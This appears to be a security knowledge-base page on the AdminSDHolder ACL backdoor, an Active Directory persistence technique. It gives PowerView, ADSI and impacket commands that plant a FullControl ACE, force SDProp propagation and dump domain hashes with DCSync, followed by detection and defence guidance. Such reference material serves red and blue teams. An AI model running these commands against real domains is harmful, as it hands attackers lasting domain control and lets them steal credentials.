---
title: AdminSDHolder ACL Backdoor
slug: adminsdholder-abuse
---

> **TL;DR:** Writing an ACE onto `CN=AdminSDHolder` plants a backdoor that SDProp re-applies every 60 minutes to every protected group member, including Domain Admins.

## What it is
`AdminSDHolder` is a template object whose security descriptor is copied by the SDProp thread to every principal flagged with `adminCount=1` (Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, etc.). Sean Metcalf documented the abuse in 2015, and it remains a textbook persistence primitive: an attacker who briefly holds DA writes a `FullControl` ACE for a controlled user onto the template, then drops privileges. SDProp re-stamps that ACE across all Tier-0 identities within an hour, restoring the backdoor even after defenders clean individual ACLs.

## Preconditions / where it applies
- Temporary write access to `CN=AdminSDHolder,CN=System,DC=corp,DC=local` (Domain Admin equivalent)
- SDProp running on the PDC emulator — enabled by default, 60-minute cadence (`AdminSDProtectFrequency` registry key)
- Persists across password resets and group removals because the ACE re-applies post-hoc

## Technique
Plant the ACE with PowerView, then verify propagation.

```powershell
# 1. Add GenericAll for attacker-controlled user on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' `
    -PrincipalIdentity backdoor `
    -Rights All

# 2. (Optional) Force SDProp to run now instead of waiting 60 minutes
$rootDSE = [ADSI]'LDAP://RootDSE'
$rootDSE.Put('RunProtectAdminGroupsTask', 1)
$rootDSE.SetInfo()

# 3. After propagation, abuse via DCSync or password reset
impacket-secretsdump -just-dc corp.local/backdoor:'Password1!'@dc01.corp.local
```

Impacket alternative for the initial write: `dacledit.py -action write -rights FullControl -principal backdoor -target-dn 'CN=AdminSDHolder,...'`.

## Detection and defence
- Event ID 5136 with `Object Class = container` and DN containing `CN=AdminSDHolder` — should be exceedingly rare outside schema upgrades
- Event ID 4780 ("The ACL was set on accounts which are members of administrators groups") fired by SDProp after a change
- Baseline the AdminSDHolder ACL and diff hourly (PingCastle, Trimarc Locksmith, `Get-ADObject ... -Properties nTSecurityDescriptor`)
- Audit `adminCount=1` users for unexpected entries and reset the flag where stale
- Defender for Identity "Suspicious modification of an AdminSDHolder object" alert

## References
- [Sean Metcalf — Sneaky Active Directory Persistence Tricks](https://adsecurity.org/?p=1929) — original AdminSDHolder writeup
- [Microsoft docs — AdminSDHolder and SDProp](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory) — protected groups reference

See also: [[acl-abuse]], [[dcsync]], [[ad-persistence]].
